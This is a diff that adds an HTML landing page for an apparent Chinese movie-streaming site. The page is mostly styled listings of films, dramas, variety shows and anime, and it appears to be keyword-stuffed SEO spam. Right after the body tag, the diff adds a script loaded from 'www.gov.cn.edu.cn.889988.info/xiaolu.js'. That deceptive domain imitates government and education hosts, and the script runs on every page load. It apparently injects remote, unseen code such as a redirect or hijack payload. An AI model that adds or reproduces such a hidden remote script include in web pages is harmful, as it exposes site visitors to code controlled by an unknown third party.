@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>神马电影网我不卡 - 高清电影在线观看不卡顿 | 最新热播影视大全</title>
+<meta name="description" content="神马电影网我不卡提供最新高清电影、电视剧、综艺、动漫在线观看，全网资源秒播不卡顿，每日更新，免费畅享流畅观影体验。">
+<meta name="keywords" content="神马电影网我不卡,神马电影网,我不卡电影,高清电影,在线观看,不卡顿,最新电影,热播影视">
+<meta name="robots" content="index,follow">
+<meta name="author" content="神马电影网我不卡">
+<meta name="theme-color" content="#050f1a">
+<meta property="og:type" content="website">
+<meta property="og:title" content="神马电影网我不卡 - 高清电影在线观看不卡顿">
+<meta property="og:description" content="全网高清电影、电视剧、综艺、动漫在线观看，秒播不卡顿，每日更新。">
+<meta property="og:url" content="https://shenmadianyingwangwobuka-wap.github.io">
+<meta name="twitter:card" content="summary">
+<link rel="canonical" href="https://shenmadianyingwangwobuka-wap.github.io">
+<style>
+/* ============ Reset ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:#050f1a;color:#dce6f0;line-height:1.65;overflow-x:hidden;
+  -webkit-tap-highlight-color:transparent;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit}
+input{font-family:inherit}
+
+/* ============ 布局 ============ */
+.wrap{width:100%;max-width:1240px;margin:0 auto;padding:0 15px}
+
+/* ============ 顶部 ============ */
+.topbar{
+  position:sticky;top:0;z-index:100;background:rgba(5,15,26,.93);
+  backdrop-filter:blur(14px);border-bottom:1px solid rgba(0,229,255,.12);
+}
+.top-inner{display:flex;align-items:center;justify-content:space-between;height:58px}
+.brand{display:flex;align-items:center;gap:9px}
+.brand-ico{
+  width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,#00e5ff,#0077ff);font-size:16px;box-shadow:0 0 16px rgba(0,229,255,.45);
+}
+.brand b{font-size:17px;font-weight:800;letter-spacing:.3px;white-space:nowrap}
+.brand b em{font-style:normal;background:linear-gradient(90deg,#00e5ff,#5b8cff);-webkit-background-clip:text;background-clip:text;color:transparent}
+.navlinks{display:flex;gap:4px}
+.navlinks a{
+  padding:7px 13px;border-radius:8px;font-size:14.5px;color:#a8bcd0;transition:.2s;white-space:nowrap;
+}
+.navlinks a:hover{color:#fff;background:rgba(0,229,255,.12)}
+.mob-toggle{display:none;width:40px;height:40px;border-radius:8px;background:rgba(0,229,255,.1);font-size:19px;color:#00e5ff}
+
+/* ============ Hero ============ */
+.hero{
+  position:relative;padding:50px 0 42px;text-align:center;overflow:hidden;
+  background:
+    radial-gradient(900px 320px at 50% 0%,rgba(0,229,255,.18),transparent 62%),
+    radial-gradient(700px 300px at 85% 30%,rgba(91,140,255,.14),transparent 60%),
+    linear-gradient(180deg,#071626,#050f1a);
+}
+.hero::after{content:"";position:absolute;inset:0;background-image:linear-gradient(rgba(0,229,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,255,.04) 1px,transparent 1px);background-size:44px 44px;mask-image:linear-gradient(180deg,#000,transparent);pointer-events:none}
+.hero .wrap{position:relative;z-index:2}
+.kicker{
+  display:inline-flex;align-items:center;gap:6px;font-size:12.5px;color:#7ee8ff;background:rgba(0,229,255,.1);
+  padding:5px 14px;border-radius:30px;border:1px solid rgba(0,229,255,.25);margin-bottom:18px;
+}
+.hero h1{font-size:32px;font-weight:900;line-height:1.28;margin-bottom:12px;letter-spacing:-.3px}
+.hero h1 i{font-style:normal;background:linear-gradient(90deg,#00e5ff,#5b8cff);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .sub{font-size:15px;color:#91a6bb;max-width:600px;margin:0 auto 24px}
+.searchbox{
+  max-width:540px;margin:0 auto;display:flex;background:rgba(255,255,255,.07);
+  border:1px solid rgba(0,229,255,.25);border-radius:12px;padding:5px;box-shadow:0 8px 30px rgba(0,0,0,.3);
+}
+.searchbox input{flex:1;border:none;background:transparent;padding:11px 15px;color:#fff;font-size:15px;outline:none}
+.searchbox input::placeholder{color:#6f8499}
+.searchbox button{
+  padding:0 24px;border-radius:8px;background:linear-gradient(135deg,#00e5ff,#0077ff);color:#03121f;font-weight:800;font-size:15px;transition:.2s;
+}
+.searchbox button:hover{filter:brightness(1.1);transform:scale(1.02)}
+.stats{display:flex;justify-content:center;gap:34px;margin-top:30px;flex-wrap:wrap}
+.stat b{display:block;font-size:21px;font-weight:800;color:#fff}
+.stat span{font-size:12px;color:#7d93a8}
+
+/* ============ 通用 ============ */
+.block{padding:42px 0}
+.sec-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:22px;flex-wrap:wrap}
+.sec-t{display:flex;align-items:center;gap:10px}
+.sec-t .bar{width:4px;height:20px;border-radius:3px;background:linear-gradient(#00e5ff,#0077ff)}
+.sec-t h2{font-size:21px;font-weight:800}
+.more{font-size:13px;color:#8aa6bd;border:1px solid rgba(0,229,255,.22);padding:6px 14px;border-radius:8px;transition:.2s}
+.more:hover{color:#fff;background:rgba(0,229,255,.12)}
+
+/* ============ 栏目一：电影（横向大卡片） ============ */
+.film-row{display:flex;flex-direction:column;gap:14px}
+.film-big{
+  display:grid;grid-template-columns:1fr;border-radius:16px;overflow:hidden;position:relative;
+  border:1px solid rgba(0,229,255,.14);background:#0a1a2c;min-height:180px;
+}
+.film-big .lay{position:absolute;inset:0;display:flex}
+.film-big .lay i{display:block;flex:1;opacity:.85}
+.film-big .txt{position:relative;z-index:2;padding:22px;display:flex;flex-direction:column;justify-content:flex-end;min-height:200px}
+.film-big .cat{display:inline-block;font-size:11.5px;color:#03121f;background:#00e5ff;padding:3px 10px;border-radius:5px;font-weight:700;width:fit-content;margin-bottom:9px}
+.film-big h3{font-size:20px;font-weight:800;margin-bottom:7px;text-shadow:0 2px 12px rgba(0,0,0,.6)}
+.film-big p{font-size:13px;color:#c9d9e8;text-shadow:0 1px 6px rgba(0,0,0,.5);max-width:560px}
+.film-big .go{margin-top:12px;display:inline-flex;align-items:center;gap:5px;font-size:13px;font-weight:700;color:#03121f;background:rgba(255,255,255,.95);padding:7px 15px;border-radius:8px;width:fit-content}
+
+/* ============ 栏目二：剧集（表格化列表） ============ */
+.tablebox{border-radius:14px;overflow:hidden;border:1px solid rgba(0,229,255,.12);background:#0a1626}
+.tbl-row{
+  display:grid;grid-template-columns:44px 1fr 76px;align-items:center;gap:12px;padding:13px 16px;
+  border-bottom:1px solid rgba(255,255,255,.05);transition:.2s;cursor:pointer;
+}
+.tbl-row:last-child{border-bottom:none}
+.tbl-row:hover{background:rgba(0,229,255,.08)}
+.tbl-row .no{font-size:13px;font-weight:800;color:#5b8cff;background:rgba(91,140,255,.12);border-radius:8px;height:32px;display:flex;align-items:center;justify-content:center}
+.tbl-mid{min-width:0}
+.tbl-mid b{display:block;font-size:15px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tbl-mid span{display:block;font-size:12px;color:#7d93a8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tbl-tag{font-size:11.5px;color:#00e5ff;border:1px solid rgba(0,229,255,.3);padding:4px 0;border-radius:6px;text-align:center;justify-self:end;width:76px}
+
+/* ============ 栏目三：综艺（圆形封面网格） ============ */
+.round-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.round-card{text-align:center;transition:.25s}
+.round-card:hover{transform:translateY(-3px)}
+.round{width:100%;aspect-ratio:1/1;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:38px;margin:0 auto 11px;border:3px solid transparent;background-clip:padding-box;transition:.25s;box-shadow:0 10px 26px rgba(0,0,0,.35)}
+.round-card:hover .round{border-color:rgba(0,229,255,.7);box-shadow:0 0 24px rgba(0,229,255,.35)}
+.round-card h4{font-size:14px;font-weight:700;margin-bottom:3px}
+.round-card small{font-size:11.5px;color:#7d93a8}
+
+/* ============ 栏目四：动漫（竖排时间轴） ============ */
+.timeline{position:relative;padding-left:6px}
+.tl-item{display:grid;grid-template-columns:1fr;gap:10px;border-radius:14px;padding:14px;margin-bottom:12px;background:#0a1626;border:1px solid rgba(0,229,255,.1);transition:.25s;position:relative;overflow:hidden}
+.tl-item::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:linear-gradient(#00e5ff,#5b8cff)}
+.tl-item:hover{border-color:rgba(0,229,255,.5);transform:translateX(3px)}
+.tl-top{display:flex;align-items:center;justify-content:space-between;gap:10px}
+.tl-top h4{font-size:15px;font-weight:800}
+.tl-top .ep{font-size:11.5px;color:#5b8cff;background:rgba(91,140,255,.14);padding:3px 9px;border-radius:20px}
+.tl-item p{font-size:12.5px;color:#8aa6bd}
+.tl-pills{display:flex;flex-wrap:wrap;gap:6px}
+.tl-pills a{font-size:11.5px;padding:4px 10px;border-radius:6px;background:rgba(255,255,255,.06);color:#c9d9e8;transition:.2s}
+.tl-pills a:hover{background:#00e5ff;color:#03121f;font-weight:700}
+
+/* ============ 页脚 ============ */
+.foot{margin-top:34px;padding:34px 0 24px;border-top:1px solid rgba(0,229,255,.1);background:#040c16}
+.foot-grid{display:grid;grid-template-columns:1fr;gap:22px;margin-bottom:24px}
+.foot h5{font-size:15px;font-weight:800;margin-bottom:11px;color:#fff}
+.foot h5 em{font-style:normal;color:#00e5ff}
+.foot p{font-size:13px;color:#7d93a8}
+.foot ul{display:flex;flex-direction:column;gap:8px}
+.foot ul a{font-size:13px;color:#8aa6bd;transition:.2s}
+.foot ul a:hover{color:#00e5ff;padding-left:4px}
+.copy{font-size:12px;color:#5b6f83;padding-top:18px;border-top:1px solid rgba(255,255,255,.06);text-align:center}
+
+/* ============ 响应式 ============ */
+@media(min-width:560px){
+  .film-row{grid-template-columns:1fr 1fr}
+  .film-big{height:240px}
+  .film-big .txt{justify-content:center;min-height:auto}
+  .round-grid{grid-template-columns:repeat(6,1fr)}
+  .tl-item{grid-template-columns:130px 1fr;align-items:center}
+  .foot-grid{grid-template-columns:1.4fr 1fr 1fr}
+}
+@media(min-width:768px){
+  .wrap{padding:0 24px}
+  .top-inner{height:66px}
+  .hero{padding:74px 0 54px}
+  .hero h1{font-size:44px}
+  .block{padding:54px 0}
+  .film-row{grid-template-columns:repeat(3,1fr)}
+  .tbl-row{grid-template-columns:52px 1fr 90px}
+}
+@media(max-width:559px){
+  .round-grid{grid-template-columns:repeat(3,1fr)}
+}
+@media(max-width:639px){
+  .navlinks{display:none;position:absolute;top:58px;left:0;right:0;flex-direction:column;padding:12px;gap:2px;background:#071626;border-bottom:1px solid rgba(0,229,255,.12)}
+  .navlinks.open{display:flex}
+  .navlinks a{width:100%;text-align:center;padding:11px}
+  .mob-toggle{display:flex;align-items:center;justify-content:center}
+  .hero h1{font-size:26px}
+  .stats{gap:24px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== 头部 ===== -->
+<header class="topbar">
+  <div class="wrap top-inner">
+    <a href="#" class="brand" aria-label="神马电影网我不卡首页">
+      <span class="brand-ico">🎬</span>
+      <b>神马<b><em>电影网我不卡</em></b></b>
+    </a>
+    <nav class="navlinks" id="nav">
+      <a href="#film">热门电影</a>
+      <a href="#drama">热播剧集</a>
+      <a href="#variety">综艺娱乐</a>
+      <a href="#anime">动漫番剧</a>
+    </nav>
+    <button class="mob-toggle" id="toggle" aria-label="菜单">≡</button>
+  </div>
+</header>
+
+<!-- ===== Hero ===== -->
+<section class="hero">
+  <div class="wrap">
+    <span class="kicker">⚡ 全网秒播 · 全程不卡顿</span>
+    <h1><i>神马电影网我不卡</i><br>高清影视，流畅看到爽</h1>
+    <p class="sub">最新院线电影、热播电视剧、综艺、动漫一站聚合，智能加速线路，告别缓冲等待，随时随地畅享观影。</p>
+    <form class="searchbox" onsubmit="return false;" role="search">
+      <input type="search" placeholder="输入片名、演员、类型，快速找片…" aria-label="搜索影视">
+      <button type="submit">立即搜索</button>
+    </form>
+    <div class="stats">
+      <div class="stat"><b>12万+</b><span>影视资源</span></div>
+      <div class="stat"><b>1080P</b><span>高清画质</span></div>
+      <div class="stat"><b>0 卡顿</b><span>极速播放</span></div>
+      <div class="stat"><b>每日</b><span>实时更新</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：热门电影（大色块横排） ===== -->
+<section class="block" id="film">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="sec-t"><span class="bar"></span><h2>热门电影</h2></div>
+      <a href="#" class="more">全部电影 ›</a>
+    </div>
+    <div class="film-row">
+
+      <article class="film-big">
+        <div class="lay">
+          <i style="background:linear-gradient(135deg,#0a2b4a,#0077ff)"></i>
+          <i style="background:linear-gradient(135deg,#0077ff,#00e5ff)"></i>
+          <i style="background:linear-gradient(135deg,#00e5ff,#0a5f7a)"></i>
+        </div>
+        <div class="txt">
+          <span class="cat">科幻 · 热映</span>
+          <h3>星际跃迁</h3>
+          <p>人类首次跃迁深空，飞船却意外坠入未知星系，船员们必须在有限氧气耗尽前找到回家的路。</p>
+          <span class="go">立即观看 →</span>
+        </div>
+      </article>
+
+      <article class="film-big">
+        <div class="lay">
+          <i style="background:linear-gradient(135deg,#2a0a2e,#7a00cc)"></i>
+          <i style="background:linear-gradient(135deg,#7a00cc,#c94bff)"></i>
+          <i style="background:linear-gradient(135deg,#c94bff,#4a0a5a)"></i>
+        </div>
+        <div class="txt">
+          <span class="cat">悬疑 · 高分</span>
+          <h3>无声证词</h3>
+          <p>一桩尘封二十年的旧案被重新翻出，法医在细微痕迹中寻找真相，凶手却近在咫尺。</p>
+          <span class="go">立即观看 →</span>
+        </div>
+      </article>
+
+      <article class="film-big">
+        <div class="lay">
+          <i style="background:linear-gradient(135deg,#2e1a00,#cc7a00)"></i>
+          <i style="background:linear-gradient(135deg,#cc7a00,#ffc94b)"></i>
+          <i style="background:linear-gradient(135deg,#ffc94b,#5a3a00)"></i>
+        </div>
+        <div class="txt">
+          <span class="cat">动作 · 大片</span>
+          <h3>极限追击</h3>
+          <p>退役特工为救挚友重出江湖，跨越三大洲上演飙车、枪战与智斗的极速追凶。</p>
+          <span class="go">立即观看 →</span>
+        </div>
+      </article>
+
+      <article class="film-big">
+        <div class="lay">
+          <i style="background:linear-gradient(135deg,#001a2e,#005a8c)"></i>
+          <i style="background:linear-gradient(135deg,#005a8c,#00b4cc)"></i>
+          <i style="background:linear-gradient(135deg,#00b4cc,#003a4a)"></i>
+        </div>
+        <div class="txt">
+          <span class="cat">动画 · 推荐</span>
+          <h3>云端之城</h3>
+          <p>少年偶遇能通往天空的神秘地图，与伙伴一同踏上寻找传说中云端之城的奇幻旅程。</p>
+          <span class="go">立即观看 →</span>
+        </div>
+      </article>
+
+      <article class="film-big">
+        <div class="lay">
+          <i style="background:linear-gradient(135deg,#2e000a,#8c0024)"></i>
+          <i style="background:linear-gradient(135deg,#8c0024,#ff4b6b)"></i>
+          <i style="background:linear-gradient(135deg,#ff4b6b,#4a0010)"></i>
+        </div>
+        <div class="txt">
+          <span class="cat">爱情 · 口碑</span>
+          <h3>南风知我意</h3>
+          <p>小镇少女与城市青年因一封误投的信相遇，从误会到心动，写下一段温柔的夏日恋曲。</p>
+          <span class="go">立即观看 →</span>
+        </div>
+      </article>
+
+      <article class="film-big">
+        <div class="lay">
+          <i style="background:linear-gradient(135deg,#002e1a,#008c4a)"></i>
+          <i style="background:linear-gradient(135deg,#008c4a,#4bff9a)"></i>
+          <i style="background:linear-gradient(135deg,#4bff9a,#004a2e)"></i>
+        </div>
+        <div class="txt">
+          <span class="cat">冒险 · 最新</span>
+          <h3>荒野求生日记</h3>
+          <p>六名素人被困无人荒岛，面对极端天气与未知野兽，究竟谁能坚持到最后？</p>
+          <span class="go">立即观看 →</span>
+        </div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：热播剧集（表格化列表） ===== -->
+<section class="block" id="drama" style="background:linear-gradient(180deg,transparent,rgba(0,229,255,.04),transparent)">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="sec-t"><span class="bar"></span><h2>热播剧集</h2></div>
+      <a href="#" class="more">全部剧集 ›</a>
+    </div>
+    <div class="tablebox">
+
+      <div class="tbl-row">
+        <span class="no">01</span>
+        <div class="tbl-mid"><b>凤鸣九天</b><span>古装 · 宫斗 · 权谋</span></div>
+        <span class="tbl-tag">更至32集</span>
+      </div>
+
+      <div class="tbl-row">
+        <span class="no">02</span>
+        <div class="tbl-mid"><b>长安缉凶录</b><span>古装 · 悬疑 · 探案</span></div>
+        <span class="tbl-tag">更至24集</span>
+      </div>
+
+      <div class="tbl-row">
+        <span class="no">03</span>
+        <div class="tbl-mid"><b>逆光而行</b><span>都市 · 职场 · 励志</span></div>
+        <span class="tbl-tag">更至18集</span>
+      </div>
+
+      <div class="tbl-row">
+        <span class="no">04</span>
+        <div class="tbl-mid"><b>山河无名</b><span>年代 · 抗战 · 谍战</span></div>
+        <span class="tbl-tag">更至40集</span>
+      </div>
+
+      <div class="tbl-row">
+        <span class="no">05</span>
+        <div class="tbl-mid"><b>生命之光</b><span>都市 · 医疗 · 情感</span></div>
+        <span class="tbl-tag">更至22集</span>
+      </div>
+
+      <div class="tbl-row">
+        <span class="no">06</span>
+        <div class="tbl-mid"><b>幻镜奇缘</b><span>奇幻 · 冒险 · 爱情</span></div>
+        <span class="tbl-tag">更至16集</span>
+      </div>
+
+      <div class="tbl-row">
+        <span class="no">07</span>
+        <div class="tbl-mid"><b>春风十里</b><span>都市 · 爱情 · 喜剧</span></div>
+        <span class="tbl-tag">更至28集</span>
+      </div>
+
+      <div class="tbl-row">
+        <span class="no">08</span>
+        <div class="tbl-mid"><b>黑金迷局</b><span>犯罪 · 商战 · 悬疑</span></div>
+        <span class="tbl-tag">更至12集</span>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：综艺娱乐（圆形封面） ===== -->
+<section class="block" id="variety">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="sec-t"><span class="bar"></span><h2>综艺娱乐</h2></div>
+      <a href="#" class="more">全部综艺 ›</a>
+    </div>
+    <div class="round-grid">
+
+      <div class="round-card">
+        <div class="round" style="background:linear-gradient(135deg,#00e5ff,#0077ff)">🎤</div>
+        <h4>唱响未来</h4><small>音乐竞演 2026</small>
+      </div>
+
+      <div class="round-card">
+        <div class="round" style="background:linear-gradient(135deg,#7a00cc,#c94bff)">🍳</div>
+        <h4>大厨驾到</h4><small>美食真人秀</small>
+      </div>
+
+      <div class="round-card">
+        <div class="round" style="background:linear-gradient(135deg,#0077ff,#00b4cc)">✈️</div>
+        <h4>说走就走</h4><small>旅行纪实</small>
+      </div>
+
+      <div class="round-card">
+        <div class="round" style="background:linear-gradient(135deg,#cc7a00,#ffc94b)">🧩</div>
+        <h4>脑力狂潮</h4><small>智力竞技</small>
+      </div>
+
+      <div class="round-card">
+        <div class="round" style="background:linear-gradient(135deg,#ff4b6b,#c94bff)">💃</div>
+        <h4>舞力全开</h4><small>舞蹈竞演</small>
+      </div>
+
+      <div class="round-card">
+        <div class="round" style="background:linear-gradient(135deg,#008c4a,#4bff9a)">🎯</div>
+        <h4>极限挑战团</h4><small>户外真人秀</small>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：动漫番剧（时间轴） ===== -->
+<section class="block" id="anime" style="background:linear-gradient(180deg,transparent,rgba(0,229,255,.04),transparent)">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="sec-t"><span class="bar"></span><h2>动漫番剧</h2></div>
+      <a href="#" class="more">全部动漫 ›</a>
+    </div>
+    <div class="timeline">
+
+      <article class="tl-item">
+        <div class="tl-top"><h4>⚡ 雷霆少年团</h4><span class="ep">更新中</span></div>
+        <p>少年们觉醒异能组建战队守护城市，面对强敌不断突破自我，点燃热血青春。</p>
+        <div class="tl-pills"><a href="#">01</a><a href="#">02</a><a href="#">03</a><a href="#">04</a><a href="#">05</a></div>
+      </article>
+
+      <article class="tl-item">
+        <div class="tl-top"><h4>🐉 灵域神兽录</h4><span class="ep">更新中</span></div>
+        <p>驭兽师踏入灵域收服上古神兽，揭开千年封印背后的惊天真相。</p>
+        <div class="tl-pills"><a href="#">01</a><a href="#">02</a><a href="#">03</a><a href="#">04</a><a href="#">05</a></div>
+      </article>
+
+      <article class="tl-item">
+        <div class="tl-top"><h4>🍜 厨神小当家</h4><span class="ep">已完结</span></div>
+        <p>天才少年厨师走遍四海，用一道道美味料理征服评委与食客的心。</p>
+        <div class="tl-pills"><a href="#">01</a><a href="#">02</a><a href="#">03</a><a href="#">04</a><a href="#">05</a></div>
+      </article>
+
+      <article class="tl-item">
+        <div class="tl-top"><h4>🚀 星海漫游者</h4><span class="ep">更新中</span></div>
+        <p>星际探险队驾驶飞船穿梭宇宙，探索未知星球与古老文明遗迹。</p>
+        <div class="tl-pills"><a href="#">01</a><a href="#">02</a><a href="#">03</a><a href="#">04</a><a href="#">05</a></div>
+      </article>
+
+      <article class="tl-item">
+        <div class="tl-top"><h4>🗡️ 剑影风云录</h4><span class="ep">已完结</span></div>
+        <p>江湖少年偶得绝世剑谱，卷入门派纷争，踏上快意恩仇的武侠之路。</p>
+        <div class="tl-pills"><a href="#">01</a><a href="#">02</a><a href="#">03</a><a href="#">04</a><a href="#">05</a></div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h5><em>神马电影网我不卡</em> · 高清不卡顿</h5>
+        <p>神马电影网我不卡专注为影迷提供最新、最全、最流畅的影视观看体验，涵盖热门电影、热播剧集、综艺娱乐、动漫番剧，智能加速全程不卡顿，每日精选更新。</p>
+      </div>
+      <div>
+        <h5>频道导航</h5>
+        <ul>
+          <li><a href="#film">热门电影</a></li>
+          <li><a href="#drama">热播剧集</a></li>
+          <li><a href="#variety">综艺娱乐</a></li>
+          <li><a href="#anime">动漫番剧</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于本站</h5>
+        <ul>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">用户协议</a></li>
+          <li><a href="#">反馈建议</a></li>
+          <li><a href="#">联系我们</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">© 2026 神马电影网我不卡 shenmadianyingwangwobuka-wap.github.io · 本站仅提供影视信息展示，资源版权归原作者及发行方所有</div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('toggle').addEventListener('click',function(){
+  document.getElementById('nav').classList.toggle('open');
+});
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+
+</body>
+</html>
